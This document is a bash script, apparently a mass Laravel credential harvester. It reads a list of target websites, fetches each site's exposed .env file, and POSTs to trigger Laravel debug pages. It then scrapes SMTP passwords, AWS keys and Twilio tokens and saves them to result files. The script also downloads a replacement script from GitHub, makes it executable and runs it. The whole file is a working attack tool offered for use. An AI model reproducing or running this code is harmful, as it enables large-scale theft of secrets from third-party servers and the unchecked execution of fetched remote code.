#!/usr/bin/env bash
#

tgl=$(date +'%A, %d %B %Y')
B="\033[1m"
MERAH="\e[1;31m"
HIJAU="\e[1;32m"
BIRU="\e[1;34m"
NOR="\e[0m"
LM='\e[41m'
LB='\e[100m'
LK='\e[43m'
CX=`cat $0 | sha256sum`
CZ=`curl "http://www.bimmer.in.th/generator/cdg.txt" -s | sha256sum`

echo ""
cat <<COUP
,---,---,---,---,---,---,---,---,---,---,---,---,---,-------,
| ~ | 1 | 2 | 3 | 4 | 5 | 6 | 7 | 8 | 9 | 0 | [ | ] | <-    |
|---'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-----|
| ->| | " | , | . | P | Y | F | G | C | R | L | / | = |  \  |
|-----',--',--',--',--',--',--',--',--',--',--',--',--'-----|
| Caps | A | O | E | U | I | D | H | T | N | S | - |  Enter |
|------'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'--------|
|        | ; | Q | J | K | X | B | M | W | V | Z |          |
|------,-',--'--,'---'---'---'---'---'---'-,-'---',--,------|
| ctrl |  | alt |                          | alt  |  | ctrl |
'------'  '-----'--------------------------'------'  '------'
                Author : CoupDeGrace
           Big Thanks : d3b~x && Index Php    
COUP
if [ ! -d result ];then
 mkdir result
fi
if [ ! -d cms ];then
 mkdir cms
fi
ENV(){
ambilenv=$(curl --silent --max-time 10 --connect-timeout 10 -L "${TARGET}/.env" | tr -d '\0')
host=$(echo "$ambilenv" | grep -Po 'MAIL_HOST=\K[^ ]+')
mailport=$(echo "$ambilenv" | grep -Po 'MAIL_PORT=\K[^ ]+')
mailname=$(echo "$ambilenv" | grep -Po 'MAIL_USERNAME=\K[^ ]+')
mailpass=$(echo "$ambilenv" | grep -Po 'MAIL_PASSWORD=\K[^ ]+')
twilio1=$(echo "$ambilenv" | grep -Po 'TWILIO_SID=\K[^ ]+')
twilio2=$(echo "$ambilenv" | grep -Po 'TWILIO_TOKEN=\K[^ ]+')
twilio3=$(echo "$ambilenv" | grep -Po 'TWILIO_FROM=\K[^ ]+')
        if [[ -z $host || $host =~ "null" || $host =~ "localhost" || $host =~ "mailtrap.io" || $host =~ "smtp.mailtrap.io" ]]; then
                        echo -e "${LM}[ERROR][$tgl] ${NOR} ${TARGET}"
                        echo "${TARGET}" >> cms/laravel.txt
                        MethodAws;
                        MethodAws2;
        else
                        echo -e "${LB}[ENVVV][$tgl] ${NOR} ${TARGET}"
                        echo "${TARGET}|$host|$mailport|$mailname|$mailpass" >> result/smtprandom.txt
                        echo "${TARGET}" >> cms/laravel.txt
        fi
        if [[ -z $twilio1 || $twilio1 =~ "null" ]]; then
                MethodAws2;
        else
                echo "${TARGET}|$twilio1|$twilio2|$twilio3" >> result/twilio.txt
                echo "${TARGET}" >> laravel.txt
        fi
}

MethodAws(){      
USERAWS1=$(echo "$ambilenv" | grep -Po 'AWS_KEY=\K[^ ]+')
PASSAWS1=$(echo "$ambilenv" | grep -Po 'AWS_SECRET=\K[^ ]+')
REGIONPAS1=$(echo "$ambilenv" | grep -Po 'AWS_REGION=\K[^ ]+')
USERAWS2=$(echo "$ambilenv" | grep -Po 'AWS_ACCESS_KEY_ID=\K[^ ]+')
PASSAWS2=$(echo "$ambilenv" | grep -Po 'AWS_SECRET_ACCESS_KEY=\K[^ ]+')
REGIONPAS2=$(echo "$ambilenv" | grep -Po 'AWS_DEFAULT_REGION=\K[^ ]+')
USERAWS3=$(echo "$ambilenv" | grep -Po 'S3_KEY=\K[^ ]+')
PASSAWS3=$(echo "$ambilenv" | grep -Po 'S3_SECRET=\K[^ ]+')
REGIONPAS3=$(echo "$ambilenv" | grep -Po 'S3_REGION=\K[^ ]+')
        if [[ $ambilenv =~ "AWS_KEY=AKIA" ]];then
                if [[ -z $USERAWS1 || $USERAWS1 =~ "null" ]]; then
                        echo "${TARGET}" > uknown.txt
                        else
                        echo "${TARGET}|$USERAWS1|$PASSAWS1|$REGIONPAS1" >> result/aws.txt
                fi
        elif [[ $ambilenv =~ "AWS_ACCESS_KEY_ID=AKIA" ]];then
                if [[ -z $USERAWS2 || $USERAWS2 =~ "null" ]]; then
                         echo "${TARGET}" > uknown.txt
                        else

                        echo "${TARGET}|$USERAWS2|$PASSAWS2|$REGIONPAS2" >> result/aws.txt
                fi
        else
                if [[ -z $USERAWS3 || $USERAWS3 =~ "null" ]]; then
                        echo "${TARGET}" > uknown.txt
                        echo "${TARGET}" >> laravel.txt
                        else
                        echo "${TARGET}|$USERAWS3|$PASSAWS3|$REGIONPAS3" >> result/aws.txt
                fi
        fi
}
MethodAws2(){
env=$(curl -skL --max-time 10 --connect-timeout 10 --request POST "${TARGET}" -o km.htm -A "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0." -H "Upgrade-Insecure-Requests" -d "h4xor=c0up" -o km.htm)
TH=$(cat km.htm | sed ':a;N;$!ba;s/\n/ /g' | sed 's/<tr/\n<tr/g' | sed 's/<\/tr>/<\/tr>\n/g' | grep '<pre' | grep "<td \|MAIL_HOST" > k.htm)
TP=$(cat km.htm | sed ':a;N;$!ba;s/\n/ /g' | sed 's/<tr/\n<tr/g' | sed 's/<\/tr>/<\/tr>\n/g' | grep '<tr' | grep "<td \|MAIL_PORT" > kc.htm)
TU=$(cat km.htm | sed ':a;N;$!ba;s/\n/ /g' | sed 's/<tr/\n<tr/g' | sed 's/<\/tr>/<\/tr>\n/g' | grep '<tr' | grep "<td \|MAIL_USERNAME" > kd.htm)
TS=$(cat km.htm | sed ':a;N;$!ba;s/\n/ /g' | sed 's/<tr/\n<tr/g' | sed 's/<\/tr>/<\/tr>\n/g' | grep '<tr' | grep "<td \|MAIL_PASSWORD" > ke.htm)
KTH=$(cat k.htm | grep -Po "<pre.*>(.*?)<\/span>" | sed 's|</span>|-|g' | sed 's|<[^>]*>||g' | sed 's/^.//' | sed 's/.$//' | tail -1)
KTP=$(cat kc.htm | grep -Po "<pre.*>(.*?)<\/span>" | sed 's|</span>|-|g' | sed 's|<[^>]*>||g' | sed 's/^.//' | sed 's/.$//' | tail -1)
KTU=$(cat kd.htm | grep -Po "<pre.*>(.*?)<\/span>" | sed 's|</span>|-|g' | sed 's|<[^>]*>||g' | sed 's/^.//' | sed 's/.$//' | tail -1)
KTS=$(cat ke.htm | grep -Po "<pre.*>(.*?)<\/span>" | sed 's|</span>|-|g' | sed 's|<[^>]*>||g' | sed 's/^.//' | sed 's/.$//' | tail -1)
SES1=$(cat km.htm | sed ':a;N;$!ba;s/\n/ /g' | sed 's/<tr/\n<tr/g' | sed 's/<\/tr>/<\/tr>\n/g' | grep '<tr' | grep "<td \|AWS_ACCESS_KEY_ID\|AWS_KEY\|SES_KEY" > ses1.htm)
SES2=$(cat km.htm | sed ':a;N;$!ba;s/\n/ /g' | sed 's/<tr/\n<tr/g' | sed 's/<\/tr>/<\/tr>\n/g' | grep '<tr' | grep "<td \|AWS_SECRET_ACCESS_KEY\|AWS_SECRET\|SES_SECRET" > ses2.htm)
SES3=$(cat km.htm | sed ':a;N;$!ba;s/\n/ /g' | sed 's/<tr/\n<tr/g' | sed 's/<\/tr>/<\/tr>\n/g' | grep '<tr' | grep "<td \|AWS_SECRET_ACCESS_KEY\|AWS_REGION\|SES_REGION" > ses3.htm)
TWILIO=$(cat km.htm | sed ':a;N;$!ba;s/\n/ /g' | sed 's/<tr/\n<tr/g' | sed 's/<\/tr>/<\/tr>\n/g' | grep '<tr' | grep "<td \|TWILIO_SID" > tw.htm)
TWILIO1=$(cat km.htm | sed ':a;N;$!ba;s/\n/ /g' | sed 's/<tr/\n<tr/g' | sed 's/<\/tr>/<\/tr>\n/g' | grep '<tr' | grep "<td \|TWILIO_TOKEN" > tw1.htm)
TWILIO2=$(cat km.htm | sed ':a;N;$!ba;s/\n/ /g' | sed 's/<tr/\n<tr/g' | sed 's/<\/tr>/<\/tr>\n/g' | grep '<tr' | grep "<td \|TWILIO_FROM" > tw3.htm)
TW1=$(cat tw.htm | grep -Po "<pre.*>(.*?)<\/span>" | sed 's|</span>|-|g' | sed 's|<[^>]*>||g' | sed 's/^.//' | sed 's/.$//' | tail -1)
TW2=$(cat tw1.htm | grep -Po "<pre.*>(.*?)<\/span>" | sed 's|</span>|-|g' | sed 's|<[^>]*>||g' | sed 's/^.//' | sed 's/.$//' | tail -1)
TW3=$(cat tw3.htm | grep -Po "<pre.*>(.*?)<\/span>" | sed 's|</span>|-|g' | sed 's|<[^>]*>||g' | sed 's/^.//' | sed 's/.$//' | tail -1)
USER1=$(cat ses1.htm | grep -Po "<pre.*>(.*?)<\/span>" | sed 's|</span>|-|g' | sed 's|<[^>]*>||g' | sed 's/^.//' | sed 's/.$//' | tail -1)
PASS1=$(cat ses2.htm | grep -Po "<pre.*>(.*?)<\/span>" | sed 's|</span>|-|g' | sed 's|<[^>]*>||g' | sed 's/^.//' | sed 's/.$//' | tail -1)
REG1=$(cat ses3.htm | grep -Po "<pre.*>(.*?)<\/span>" | sed 's|</span>|-|g' | sed 's|<[^>]*>||g' | sed 's/^.//' | sed 's/.$//' | tail -1)
 if [[ -z $KTH || $KTH =~ "null" || $KTH =~ "localhost" || $KTH =~ "mailtrap.io" || $KTH =~ "smtp.mailtrap.io" ]]; then
                echo "${TARGET}" >> cms/laravel.txt
        else
                echo -e "${LK}[DEBUG][$tgl] ${NOR} ${TARGET}"
                echo "${TARGET}|$KTH|$KTP|$KTU|$KTS" >> result/smtprandom.txt
                echo "${TARGET}" >> cms/laravel.txt
 fi
        if [[ $USER1 =~ "AWS_KEY=AKIA" ]];then
                if [[ -z $USER1 || $USER1 =~ "null" ]]; then
                        echo "${TARGET}" > uknown.txt
                        else
                        echo "${TARGET}|$USER1|$PASS1|$REG1" >> result/aws.txt
                fi
        elif [[ $USER1 =~ "AWS_ACCESS_KEY_ID=AKIA" ]];then
                if [[ -z $USER1 || $USER1 =~ "null" ]]; then
                         echo "${TARGET}" > uknown.txt
                        else
                        echo "${TARGET}|$USER1|$PASS1|$REG1" >> result/aws.txt
                fi
        else
                if [[ -z $USER1 || $USER1 =~ "null" ]]; then
                        echo "${TARGET}" > uknown.txt
                        echo "${TARGET}" >> laravel.txt
                        else
                        echo "${TARGET}|$USER1|$PASS1|$REG1" >> result/aws.txt
                fi
        fi
                if [[ -z $TW1 || $TW1 =~ "null" ]]; then
                         echo "${TARGET}" > uknown.txt
                        else
                        echo "${TARGET}|$TW1|$TW2|$TW3" >> result/twilio.txt
                fi
}

  if [[ $CX != $CZ ]]; then
    echo "Script Butuh diupdate"
    wget -q "https://raw.githubusercontent.com/indo2010re/LARAVELBOT/master/yo.txt" 
    rm -f scan 
    mv yo.txt scan 
    chmod +x scan
    echo "$USER filenya siap digunakan."
    sleep 2
    ./scan
  else
    ./scan
  fi
  exit 1 
 
echo ""
read -p "Weblist: " TARGETX
if [[ ! -f $TARGETX ]]; then
        echo " $TARGETX Tidak Ditemukan"
        exit 1
fi

IFS=$'\r\n'
n=1
t=2
for TARGET in $(cat $TARGETX); do
        f=$(expr $n % $t)
        if [[ $f == 0 && $n > 0 ]]; then
                sleep 1
        fi
        ENV $TARGET $n &
        n=$[$n+1]
done
wait
